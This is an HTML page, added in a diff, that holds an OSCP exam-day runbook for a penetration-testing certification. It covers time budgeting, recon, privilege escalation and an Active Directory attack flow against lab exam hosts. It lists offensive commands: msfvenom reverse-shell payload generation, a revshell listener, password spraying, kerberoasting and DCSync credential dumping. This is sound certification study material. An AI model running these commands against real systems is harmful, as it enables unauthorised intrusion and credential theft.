@@ -1,0 +1,371 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>🎯 OSCP EXAM-DAY RUNBOOK</title>
+<style>
+:root{
+  color-scheme: light dark;
+  --bg:#f4f6f8; --surface:#fff; --surface-2:#eef1f4;
+  --fg:#16202a; --muted:#5a6b7a; --faint:#8595a3; --border:#d8dee4;
+  --accent:#1f6feb; --accent-soft:#e6f0ff;
+  --term-bg:#0d1b24; --term-fg:#d6e6ef;
+  --shadow:0 1px 3px rgba(20,32,42,.08), 0 6px 20px rgba(20,32,42,.05);
+  --mono:"JetBrains Mono",ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  --sans:"Inter",system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+}
+@media (prefers-color-scheme:dark){
+  :root:not([data-theme=light]){
+    --bg:#0b1016; --surface:#141b23; --surface-2:#1b2430;
+    --fg:#d6e0ea; --muted:#8595a3; --faint:#61707e; --border:#263140;
+    --accent:#4f9dff; --accent-soft:#14263c;
+    --shadow:0 1px 3px rgba(0,0,0,.45), 0 6px 20px rgba(0,0,0,.35);
+  }
+}
+:root[data-theme=dark]{
+  --bg:#0b1016; --surface:#141b23; --surface-2:#1b2430;
+  --fg:#d6e0ea; --muted:#8595a3; --faint:#61707e; --border:#263140;
+  --accent:#4f9dff; --accent-soft:#14263c;
+  --shadow:0 1px 3px rgba(0,0,0,.45), 0 6px 20px rgba(0,0,0,.35);
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth; scroll-padding-top:70px}
+body{margin:0; background:var(--bg); color:var(--fg); font:15px/1.6 var(--sans);
+  -webkit-text-size-adjust:100%}
+a{color:var(--accent); text-decoration:none}
+a:hover{text-decoration:underline}
+.topbar{position:sticky; top:0; z-index:20; background:var(--surface);
+  border-bottom:1px solid var(--border); box-shadow:var(--shadow)}
+.topbar .wrap{max-width:1180px; margin:0 auto; padding:12px 20px;
+  display:flex; align-items:center; gap:12px}
+.brand{font-weight:700; letter-spacing:.3px}
+.brand .dot{color:var(--accent)}
+#themeBtn{margin-left:auto; cursor:pointer; border:1px solid var(--border);
+  background:var(--surface-2); color:var(--fg); border-radius:8px;
+  padding:6px 12px; font:inherit; font-size:13px}
+.layout{max-width:1180px; margin:0 auto; display:grid;
+  grid-template-columns:260px minmax(0,1fr); gap:28px; padding:22px 20px 80px}
+.sidebar{position:sticky; top:70px; align-self:start; max-height:calc(100vh - 90px);
+  overflow:auto}
+.toc-title{font-size:12px; text-transform:uppercase; letter-spacing:.08em;
+  color:var(--faint); margin:4px 0 8px}
+.toc ul{list-style:none; margin:0; padding:0 0 0 2px}
+.toc li{margin:1px 0}
+.toc a{display:block; padding:3px 8px; border-left:2px solid transparent;
+  color:var(--muted); font-size:13.5px; border-radius:0 6px 6px 0}
+.toc a:hover{color:var(--fg); background:var(--surface-2); text-decoration:none}
+.toc .lvl-3 a{padding-left:20px; font-size:12.5px}
+.toc .lvl-4 a{padding-left:32px; font-size:12px}
+.content{min-width:0; background:var(--surface); border:1px solid var(--border);
+  border-radius:14px; box-shadow:var(--shadow); padding:34px 40px}
+.content>*:first-child{margin-top:0}
+h1,h2,h3,h4{line-height:1.25; scroll-margin-top:72px}
+h1{font-size:30px; margin:0 0 18px; padding-bottom:12px;
+  border-bottom:2px solid var(--border)}
+h2{font-size:22px; margin:34px 0 12px; padding-bottom:6px;
+  border-bottom:1px solid var(--border)}
+h3{font-size:17px; margin:24px 0 8px}
+h4{font-size:15px; margin:18px 0 6px; color:var(--muted)}
+p,li{overflow-wrap:anywhere}
+code{font-family:var(--mono); font-size:.88em; background:var(--surface-2);
+  border:1px solid var(--border); border-radius:5px; padding:.08em .38em}
+pre{background:var(--term-bg); color:var(--term-fg); border-radius:10px;
+  padding:14px 16px; overflow:auto; font-size:13px; line-height:1.5;
+  border:1px solid #0a141b}
+pre code{background:none; border:0; padding:0; color:inherit; font-size:inherit}
+blockquote{margin:14px 0; padding:10px 16px; border-left:4px solid var(--accent);
+  background:var(--accent-soft); border-radius:0 8px 8px 0; color:var(--fg)}
+blockquote>*:first-child{margin-top:0} blockquote>*:last-child{margin-bottom:0}
+table{border-collapse:collapse; width:100%; margin:14px 0; font-size:13.5px;
+  display:block; overflow-x:auto}
+th,td{border:1px solid var(--border); padding:7px 11px; text-align:left;
+  vertical-align:top}
+th{background:var(--surface-2); font-weight:600}
+tr:nth-child(even) td{background:var(--surface-2)}
+hr{border:0; border-top:1px solid var(--border); margin:28px 0}
+img{max-width:100%; height:auto}
+.headerlink{opacity:0; margin-left:.4em; font-weight:400; color:var(--faint)}
+h1:hover .headerlink,h2:hover .headerlink,h3:hover .headerlink,
+h4:hover .headerlink{opacity:1; text-decoration:none}
+@media (max-width:860px){
+  .layout{grid-template-columns:1fr; gap:0}
+  .sidebar{position:static; max-height:none; margin-bottom:18px;
+    border:1px solid var(--border); border-radius:12px; padding:12px 14px;
+    background:var(--surface)}
+  .content{padding:22px 18px; border-radius:12px}
+}
+pre { line-height: 125%; }
+td.linenos .normal { color: #aaaaaa; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+span.linenos { color: #aaaaaa; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+td.linenos .special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+span.linenos.special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+.codehilite .hll { background-color: #404040 }
+.codehilite { background: #202020; color: #D0D0D0 }
+.codehilite .c { color: #ABABAB; font-style: italic } /* Comment */
+.codehilite .err { color: #A61717; background-color: #E3D2D2 } /* Error */
+.codehilite .esc { color: #D0D0D0 } /* Escape */
+.codehilite .g { color: #D0D0D0 } /* Generic */
+.codehilite .k { color: #6EBF26; font-weight: bold } /* Keyword */
+.codehilite .l { color: #D0D0D0 } /* Literal */
+.codehilite .n { color: #D0D0D0 } /* Name */
+.codehilite .o { color: #D0D0D0 } /* Operator */
+.codehilite .x { color: #D0D0D0 } /* Other */
+.codehilite .p { color: #D0D0D0 } /* Punctuation */
+.codehilite .ch { color: #ABABAB; font-style: italic } /* Comment.Hashbang */
+.codehilite .cm { color: #ABABAB; font-style: italic } /* Comment.Multiline */
+.codehilite .cp { color: #FF3A3A; font-weight: bold } /* Comment.Preproc */
+.codehilite .cpf { color: #ABABAB; font-style: italic } /* Comment.PreprocFile */
+.codehilite .c1 { color: #ABABAB; font-style: italic } /* Comment.Single */
+.codehilite .cs { color: #E50808; font-weight: bold; background-color: #520000 } /* Comment.Special */
+.codehilite .gd { color: #FF3A3A } /* Generic.Deleted */
+.codehilite .ge { color: #D0D0D0; font-style: italic } /* Generic.Emph */
+.codehilite .ges { color: #D0D0D0; font-weight: bold; font-style: italic } /* Generic.EmphStrong */
+.codehilite .gr { color: #FF3A3A } /* Generic.Error */
+.codehilite .gh { color: #FFF; font-weight: bold } /* Generic.Heading */
+.codehilite .gi { color: #589819 } /* Generic.Inserted */
+.codehilite .go { color: #CCC } /* Generic.Output */
+.codehilite .gp { color: #AAA } /* Generic.Prompt */
+.codehilite .gs { color: #D0D0D0; font-weight: bold } /* Generic.Strong */
+.codehilite .gu { color: #FFF; text-decoration: underline } /* Generic.Subheading */
+.codehilite .gt { color: #FF3A3A } /* Generic.Traceback */
+.codehilite .kc { color: #6EBF26; font-weight: bold } /* Keyword.Constant */
+.codehilite .kd { color: #6EBF26; font-weight: bold } /* Keyword.Declaration */
+.codehilite .kn { color: #6EBF26; font-weight: bold } /* Keyword.Namespace */
+.codehilite .kp { color: #6EBF26 } /* Keyword.Pseudo */
+.codehilite .kr { color: #6EBF26; font-weight: bold } /* Keyword.Reserved */
+.codehilite .kt { color: #6EBF26; font-weight: bold } /* Keyword.Type */
+.codehilite .ld { color: #D0D0D0 } /* Literal.Date */
+.codehilite .m { color: #51B2FD } /* Literal.Number */
+.codehilite .s { color: #ED9D13 } /* Literal.String */
+.codehilite .na { color: #BBB } /* Name.Attribute */
+.codehilite .nb { color: #2FBCCD } /* Name.Builtin */
+.codehilite .nc { color: #71ADFF; text-decoration: underline } /* Name.Class */
+.codehilite .no { color: #40FFFF } /* Name.Constant */
+.codehilite .nd { color: #FFA500 } /* Name.Decorator */
+.codehilite .ni { color: #D0D0D0 } /* Name.Entity */
+.codehilite .ne { color: #BBB } /* Name.Exception */
+.codehilite .nf { color: #71ADFF } /* Name.Function */
+.codehilite .nl { color: #D0D0D0 } /* Name.Label */
+.codehilite .nn { color: #71ADFF; text-decoration: underline } /* Name.Namespace */
+.codehilite .nx { color: #D0D0D0 } /* Name.Other */
+.codehilite .py { color: #D0D0D0 } /* Name.Property */
+.codehilite .nt { color: #6EBF26; font-weight: bold } /* Name.Tag */
+.codehilite .nv { color: #40FFFF } /* Name.Variable */
+.codehilite .ow { color: #6EBF26; font-weight: bold } /* Operator.Word */
+.codehilite .pm { color: #D0D0D0 } /* Punctuation.Marker */
+.codehilite .w { color: #666 } /* Text.Whitespace */
+.codehilite .mb { color: #51B2FD } /* Literal.Number.Bin */
+.codehilite .mf { color: #51B2FD } /* Literal.Number.Float */
+.codehilite .mh { color: #51B2FD } /* Literal.Number.Hex */
+.codehilite .mi { color: #51B2FD } /* Literal.Number.Integer */
+.codehilite .mo { color: #51B2FD } /* Literal.Number.Oct */
+.codehilite .sa { color: #ED9D13 } /* Literal.String.Affix */
+.codehilite .sb { color: #ED9D13 } /* Literal.String.Backtick */
+.codehilite .sc { color: #ED9D13 } /* Literal.String.Char */
+.codehilite .dl { color: #ED9D13 } /* Literal.String.Delimiter */
+.codehilite .sd { color: #ED9D13 } /* Literal.String.Doc */
+.codehilite .s2 { color: #ED9D13 } /* Literal.String.Double */
+.codehilite .se { color: #ED9D13 } /* Literal.String.Escape */
+.codehilite .sh { color: #ED9D13 } /* Literal.String.Heredoc */
+.codehilite .si { color: #ED9D13 } /* Literal.String.Interpol */
+.codehilite .sx { color: #FFA500 } /* Literal.String.Other */
+.codehilite .sr { color: #ED9D13 } /* Literal.String.Regex */
+.codehilite .s1 { color: #ED9D13 } /* Literal.String.Single */
+.codehilite .ss { color: #ED9D13 } /* Literal.String.Symbol */
+.codehilite .bp { color: #2FBCCD } /* Name.Builtin.Pseudo */
+.codehilite .fm { color: #71ADFF } /* Name.Function.Magic */
+.codehilite .vc { color: #40FFFF } /* Name.Variable.Class */
+.codehilite .vg { color: #40FFFF } /* Name.Variable.Global */
+.codehilite .vi { color: #40FFFF } /* Name.Variable.Instance */
+.codehilite .vm { color: #40FFFF } /* Name.Variable.Magic */
+.codehilite .il { color: #51B2FD } /* Literal.Number.Integer.Long */</style>
+</head>
+<body>
+<header class="topbar"><div class="wrap">
+  <span class="brand">OSCP Env<span class="dot"> / </span>Docs</span>
+  <button id="themeBtn" type="button" aria-label="Toggle theme">Theme</button>
+</div></header>
+<div class="layout">
+  <aside class="sidebar"><nav class="toc"><div class="toc-title">On this page</div><ul><li class="lvl-2"><a href="#0-scoring-time-budget">0. SCORING &amp; TIME BUDGET</a></li><li class="lvl-2"><a href="#golden-rules-dont-fail-on-a-technicality">⛔ GOLDEN RULES (don't fail on a technicality)</a></li><li class="lvl-2"><a href="#1-exam-start-first-10-minutes">1. EXAM START (first 10 minutes)</a></li><li class="lvl-2"><a href="#2-recon-hit-all-6-immediately-triage-while-they-run">2. RECON — hit all 6 immediately, triage while they run</a></li><li class="lvl-2"><a href="#3-standalone-loop-repeat-per-box">3. STANDALONE LOOP (repeat per box)</a><ul><li class="lvl-3"><a href="#foothold-helpers">Foothold helpers</a></li><li class="lvl-3"><a href="#privesc-quick-refs-see-cheatsheets-for-full">PrivEsc quick refs (see cheatsheets/ for full)</a></li></ul></li><li class="lvl-2"><a href="#4-active-directory-set-40-pts-do-it-early">4. ACTIVE DIRECTORY SET (40 pts — do it early)</a></li><li class="lvl-2"><a href="#5-proof-capture-do-it-the-instant-you-get-a-flag">5. PROOF CAPTURE (do it the instant you get a flag)</a></li><li class="lvl-2"><a href="#6-reporting">6. REPORTING</a></li><li class="lvl-2"><a href="#7-when-stuck-timebox-45-min-per-rabbit-hole">7. WHEN STUCK (timebox = 45 min per rabbit hole)</a></li><li class="lvl-2"><a href="#8-end-of-exam-checklist">8. END-OF-EXAM CHECKLIST</a></li></ul></nav></aside>
+  <main class="content"><h1 id="oscp-exam-day-runbook">🎯 OSCP EXAM-DAY RUNBOOK<a class="headerlink" href="#oscp-exam-day-runbook" title="Permanent link">&para;</a></h1>
+<blockquote>
+<p>Follow this top to bottom. Every command is copy-paste ready.
+Scripts live in <code>~/Desktop/OSCP-Notes-and-Environment/OSCP-Exam/scripts/</code> (run as <code>scripts/&lt;name&gt;.sh</code>); invoke reconx via <code>scripts/rx.sh</code>.
+<strong><code>cd ~/Desktop/OSCP-Notes-and-Environment/OSCP-Exam</code> first.</strong></p>
+</blockquote>
+<hr />
+<h2 id="0-scoring-time-budget">0. SCORING &amp; TIME BUDGET<a class="headerlink" href="#0-scoring-time-budget" title="Permanent link">&para;</a></h2>
+<ul>
+<li><strong>Pass = 70 / 100.</strong> Report due <strong>24h after</strong> exam window ends.</li>
+<li>Layout: <strong>AD set = 40 pts</strong> (DC01 + MS01 + MS02, chained — treat as one objective).
+  <strong>3 standalones = 20 pts each</strong> (usually 10 local.txt + 10 proof.txt).</li>
+<li><strong>Suggested clock (23h45m):</strong>
+  | Block | Time | Goal |
+  |-------|------|------|
+  | Recon ALL 6 | 0:00–0:45 | fire recon at everything, then triage |
+  | AD set | 0:45–6:00 | 40 pts — do this while fresh |
+  | Standalone #1 | 6:00–9:00 | +20 → likely at pass |
+  | Standalone #2 | 9:00–12:00 | +20 |
+  | Standalone #3 | 12:00–15:00 | cushion |
+  | <strong>SLEEP</strong> | 15:00–20:00 | brain &gt; brute force |
+  | Cleanup / re-attempts | 20:00–22:00 | grab missing proofs |
+  | Report polish | last 2h + next day | screenshots → PDF |</li>
+<li><strong>Once you hit 70, STOP hunting and START screenshotting.</strong> Points you can't prove don't count.</li>
+</ul>
+<hr />
+<h2 id="golden-rules-dont-fail-on-a-technicality">⛔ GOLDEN RULES (don't fail on a technicality)<a class="headerlink" href="#golden-rules-dont-fail-on-a-technicality" title="Permanent link">&para;</a></h2>
+<ul>
+<li><strong>Metasploit / Meterpreter: ONE standalone box only. NEVER on the AD set.</strong>
+  <code>msfvenom</code> payloads + multi/handler are unlimited; the auto-exploit restriction is what to watch.</li>
+<li><strong>No automated exploitation tools</strong> — no sqlmap <code>--os-shell</code>, no autopwn. <code>reconx</code>/AutoRecon recon is fine; keep reconx in enum mode, never let it fire an exploit chain.</li>
+<li><strong>Screenshot EVERY flag</strong> with <code>type %COMPUTERNAME%</code> / <code>hostname &amp;&amp; id</code> + <code>ipconfig</code>/<code>ip a</code> in the same frame.</li>
+<li><strong>Log everything:</strong> run under <code>logsession.sh</code> so you have a full transcript if a screenshot is lost.</li>
+<li>Re-read the official exam guide the morning of — OffSec tweaks rules.</li>
+</ul>
+<hr />
+<h2 id="1-exam-start-first-10-minutes">1. EXAM START (first 10 minutes)<a class="headerlink" href="#1-exam-start-first-10-minutes" title="Permanent link">&para;</a></h2>
+<div class="codehilite"><pre><span></span><code><span class="nb">cd</span><span class="w"> </span>~/Desktop/OSCP-Notes-and-Environment/OSCP-Exam
+
+<span class="c1"># health-check the toolbox (fix any ✗ before you need it)</span>
+~/Desktop/OSCP-Notes-and-Environment/pakcyberbots_OSCP_environment/oscp-doctor
+
+<span class="c1"># verify staged payloads are intact</span>
+<span class="o">(</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>serve<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>sha256sum<span class="w"> </span>-c<span class="w"> </span>MANIFEST.sha256<span class="w"> </span><span class="o">)</span><span class="w">   </span><span class="c1"># single top-level manifest (./subdir/ paths)</span>
+
+<span class="c1"># start a logged shell (transcript -&gt; logs/)</span>
+scripts/logsession.sh<span class="w"> </span>exam
+
+<span class="c1"># load target IPs from the control-panel file (sets DC01_IP/MS01_IP/MS02_IP + T1_IP/T2_IP/T3_IP)</span>
+~/Desktop/OSCP-Notes-and-Environment/pakcyberbots_OSCP_environment/setup_pentest_env<span class="w"> </span>--oscp-exam<span class="w"> </span>exam-ips.txt
+
+<span class="c1"># tmux workspace: serve | listener | work panes</span>
+scripts/oscp-layout.sh<span class="w"> </span>exam<span class="w">        </span><span class="c1"># attach later: tmux attach -t exam</span>
+</code></pre></div>
+
+<p>Start your <strong>serve</strong> and <strong>listener</strong> panes so they're always ready:</p>
+<div class="codehilite"><pre><span></span><code>scripts/serve.sh<span class="w"> </span><span class="m">7890</span><span class="w">               </span><span class="c1"># serve the kit (from the right serve/ subdir)</span>
+scripts/listener.sh<span class="w"> </span><span class="m">443</span><span class="w">             </span><span class="c1"># catch-all revshell listener</span>
+</code></pre></div>
+
+<hr />
+<h2 id="2-recon-hit-all-6-immediately-triage-while-they-run">2. RECON — hit all 6 immediately, triage while they run<a class="headerlink" href="#2-recon-hit-all-6-immediately-triage-while-they-run" title="Permanent link">&para;</a></h2>
+<div class="codehilite"><pre><span></span><code><span class="c1"># reconx wrapper: rx &lt;name&gt; &lt;target&gt;  (output -&gt; targets/&lt;name&gt;/scans/reconx/)</span>
+scripts/rx.sh<span class="w"> </span>dc01<span class="w"> </span><span class="nv">$DC01_IP</span>
+scripts/rx.sh<span class="w"> </span>ms01<span class="w"> </span><span class="nv">$MS01_IP</span>
+scripts/rx.sh<span class="w"> </span>ms02<span class="w"> </span><span class="nv">$MS02_IP</span>
+scripts/rx.sh<span class="w"> </span>t1<span class="w">   </span><span class="nv">$T1_IP</span>
+scripts/rx.sh<span class="w"> </span>t2<span class="w">   </span><span class="nv">$T2_IP</span>
+scripts/rx.sh<span class="w"> </span>t3<span class="w">   </span><span class="nv">$T3_IP</span>
+<span class="c1"># no-dep fallback if reconx misbehaves:  scripts/recon.sh &lt;ip&gt; &lt;name&gt;</span>
+</code></pre></div>
+
+<p>While scans run, open each <code>targets/&lt;name&gt;/notes.md</code> and start filling the Ports/Services table.
+<strong>Triage rule:</strong> attack the box with the most obvious version-pinned service first.</p>
+<hr />
+<h2 id="3-standalone-loop-repeat-per-box">3. STANDALONE LOOP (repeat per box)<a class="headerlink" href="#3-standalone-loop-repeat-per-box" title="Permanent link">&para;</a></h2>
+<div class="codehilite"><pre><span></span><code>1. Full nmap  -&gt;  enumerate every service (web, smb, ftp, snmp...)
+2. Web:  feroxbuster/ffuf + whatweb + nikto  -&gt;  version -&gt; searchsploit
+3. SMB:  smbmap -H &lt;ip&gt; -u &#39;&#39; ; enum4linux-ng ; smbclient -N -L //&lt;ip&gt;/
+4. Foothold: manual exploit (edit searchsploit PoC) OR creds -&gt; service
+5. Serve payload:  (kit already served) wget http://&lt;YOU&gt;/linux/linpeas.sh
+6. PrivEsc: linpeas / winPEASx64 -&gt; pick vector -&gt; escalate
+7. CAPTURE PROOFS (below) BEFORE moving on
+</code></pre></div>
+
+<h3 id="foothold-helpers">Foothold helpers<a class="headerlink" href="#foothold-helpers" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code>searchsploit<span class="w"> </span>&lt;product&gt;<span class="w"> </span>&lt;version&gt;
+searchsploit<span class="w"> </span>-m<span class="w"> </span>&lt;path&gt;<span class="w">              </span><span class="c1"># copy PoC into cwd, then READ &amp; edit it</span>
+msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/x64/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="nv">$YOURIP</span><span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span><span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>rev.exe
+msfvenom<span class="w"> </span>-p<span class="w"> </span>linux/x64/shell_reverse_tcp<span class="w">  </span><span class="nv">LHOST</span><span class="o">=</span><span class="nv">$YOURIP</span><span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span><span class="w"> </span>-f<span class="w"> </span>elf<span class="w"> </span>-o<span class="w"> </span>rev.elf
+</code></pre></div>
+
+<h3 id="privesc-quick-refs-see-cheatsheets-for-full">PrivEsc quick refs (see cheatsheets/ for full)<a class="headerlink" href="#privesc-quick-refs-see-cheatsheets-for-full" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>Linux:</strong> <code>sudo -l</code>, SUID (<code>find / -perm -4000 2&gt;/dev/null</code>), cron, caps, kernel, PATH hijack, pspy64.</li>
+<li><strong>Windows:</strong> <code>whoami /priv</code> → SeImpersonate → <code>PrintSpoofer64.exe</code>/<code>GodPotato-NET4.exe</code>; unquoted service paths; AlwaysInstallElevated; stored creds. winPEAS to enumerate.</li>
+</ul>
+<hr />
+<h2 id="4-active-directory-set-40-pts-do-it-early">4. ACTIVE DIRECTORY SET (40 pts — do it early)<a class="headerlink" href="#4-active-directory-set-40-pts-do-it-early" title="Permanent link">&para;</a></h2>
+<div class="codehilite"><pre><span></span><code><span class="c1"># discover live hosts / build hosts file</span>
+scripts/gen-hosts.sh<span class="w"> </span>-r<span class="w"> </span>&lt;CIDR&gt;<span class="w">            </span><span class="c1"># e.g. -r 10.10.x.0/24</span>
+
+<span class="c1"># enum + kerberoast/asrep + crack (userlist enum built in)</span>
+scripts/ad-fastpath.sh<span class="w"> </span>-d<span class="w"> </span>&lt;domain.local&gt;<span class="w"> </span>-i<span class="w"> </span><span class="nv">$DC01_IP</span>
+<span class="c1">#   add creds once you have them:   -u &lt;user&gt; -p &#39;&lt;pass&gt;&#39;   (or -H &lt;nthash&gt;)</span>
+<span class="c1">#   -s spray  -b bloodhound  -c crack</span>
+
+<span class="c1"># once you own creds/hashes -&gt; dump + lateral</span>
+scripts/ad-secretsdump.sh<span class="w"> </span>-t<span class="w"> </span><span class="nv">$DC01_IP</span><span class="w"> </span>-d<span class="w"> </span>&lt;domain.local&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&lt;pass&gt;&#39;</span><span class="w">   </span><span class="c1"># DCSync on DC</span>
+scripts/ad-secretsdump.sh<span class="w"> </span>-t<span class="w"> </span><span class="nv">$MS01_IP</span><span class="w"> </span>-d<span class="w"> </span>.<span class="w"> </span>-H<span class="w"> </span>&lt;local-nthash&gt;<span class="w">                    </span><span class="c1"># local SAM/LSA</span>
+
+<span class="c1"># BloodHound for the path</span>
+scripts/bloodhound.sh<span class="w"> </span>start<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>scripts/bloodhound.sh<span class="w"> </span>pw<span class="w">    </span><span class="c1"># UI http://localhost:8080</span>
+</code></pre></div>
+
+<p><strong>AD flow:</strong> foothold on one host → loot creds → BloodHound the path to DA → move laterally (evil-winrm / netexec / RDP) → collect proof on <strong>all three</strong> AD hosts.</p>
+<div class="codehilite"><pre><span></span><code>evil-winrm<span class="w"> </span>-i<span class="w"> </span>&lt;ip&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&lt;pass&gt;&#39;</span><span class="w">          </span><span class="c1"># or -H &lt;nthash&gt;</span>
+netexec<span class="w"> </span>smb<span class="w"> </span>&lt;ip&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&lt;pass&gt;&#39;</span><span class="w"> </span>--shares<span class="w">   </span><span class="c1"># spray/validate creds across hosts</span>
+</code></pre></div>
+
+<hr />
+<h2 id="5-proof-capture-do-it-the-instant-you-get-a-flag">5. PROOF CAPTURE (do it the instant you get a flag)<a class="headerlink" href="#5-proof-capture-do-it-the-instant-you-get-a-flag" title="Permanent link">&para;</a></h2>
+<div class="codehilite"><pre><span></span><code><span class="c1"># record each flag into report/proof-tally.csv</span>
+scripts/proof.sh<span class="w"> </span>-n<span class="w"> </span>&lt;name&gt;<span class="w"> </span>-i<span class="w"> </span>&lt;ip&gt;<span class="w"> </span>-t<span class="w"> </span><span class="nb">local</span><span class="w"> </span>-f<span class="w"> </span>&lt;local.txt-contents&gt;
+scripts/proof.sh<span class="w"> </span>-n<span class="w"> </span>&lt;name&gt;<span class="w"> </span>-i<span class="w"> </span>&lt;ip&gt;<span class="w"> </span>-t<span class="w"> </span>proof<span class="w"> </span>-f<span class="w"> </span>&lt;proof.txt-contents&gt;
+</code></pre></div>
+
+<p>Screenshot in the SAME frame as the flag:
+- Windows: <code>type C:\Users\...\local.txt &amp; whoami &amp; ipconfig</code>
+- Linux:   <code>cat /home/*/local.txt; id; ip a</code>
+- Root/SYSTEM proof: same, with <code>proof.txt</code> + privileged whoami.</p>
+<p>Check your live score anytime:</p>
+<div class="codehilite"><pre><span></span><code>cat<span class="w"> </span>report/proof-tally.csv
+</code></pre></div>
+
+<hr />
+<h2 id="6-reporting">6. REPORTING<a class="headerlink" href="#6-reporting" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Fill each <code>targets/&lt;name&gt;/notes.md</code> <strong>as you go</strong> — steps, commands, screenshots.</li>
+<li>Assemble into the report template, then:</li>
+</ul>
+<div class="codehilite"><pre><span></span><code>scripts/md2report.sh<span class="w"> </span>report/OSCP-Report-Final.md<span class="w"> </span>-d<span class="w">   </span><span class="c1"># -&gt; PDF (+ .docx)</span>
+</code></pre></div>
+
+<ul>
+<li>Checklist before submit: every claimed box has <strong>local + proof screenshots</strong>, exact commands shown, IPs visible, repeatable steps. No proof screenshot = <strong>no points</strong>.</li>
+</ul>
+<hr />
+<h2 id="7-when-stuck-timebox-45-min-per-rabbit-hole">7. WHEN STUCK (timebox = 45 min per rabbit hole)<a class="headerlink" href="#7-when-stuck-timebox-45-min-per-rabbit-hole" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Re-read the <strong>full</strong> nmap — did you skip a port/service?</li>
+<li>Try a different wordlist / recurse deeper on web.</li>
+<li>Default creds; creds you already looted reused elsewhere (<code>netexec</code> spray).</li>
+<li>Look at it as a human: what's the <em>intended</em> path? Version → exploit-db.</li>
+<li>Still stuck after 45 min → <strong>switch boxes</strong>, come back with fresh eyes.</li>
+</ul>
+<h2 id="8-end-of-exam-checklist">8. END-OF-EXAM CHECKLIST<a class="headerlink" href="#8-end-of-exam-checklist" title="Permanent link">&para;</a></h2>
+<ul>
+<li>[ ] <code>proof-tally.csv</code> shows ≥ 70 pts</li>
+<li>[ ] Every box: local.txt + proof.txt screenshots saved</li>
+<li>[ ] All notes.md filled with reproducible steps</li>
+<li>[ ] Report PDF generated and opens correctly</li>
+<li>[ ] Submitted before the report deadline</li>
+</ul></main>
+</div>
+<script>
+(function(){
+  var KEY="oscp-docs-theme", root=document.documentElement,
+      btn=document.getElementById("themeBtn");
+  try{ var s=localStorage.getItem(KEY); if(s) root.setAttribute("data-theme",s); }catch(e){}
+  btn.addEventListener("click", function(){
+    var cur=root.getAttribute("data-theme");
+    if(!cur){ cur=matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light"; }
+    var next=cur==="dark"?"light":"dark";
+    root.setAttribute("data-theme",next);
+    try{ localStorage.setItem(KEY,next); }catch(e){}
+  });
+})();
+</script>
+</body>
+</html>
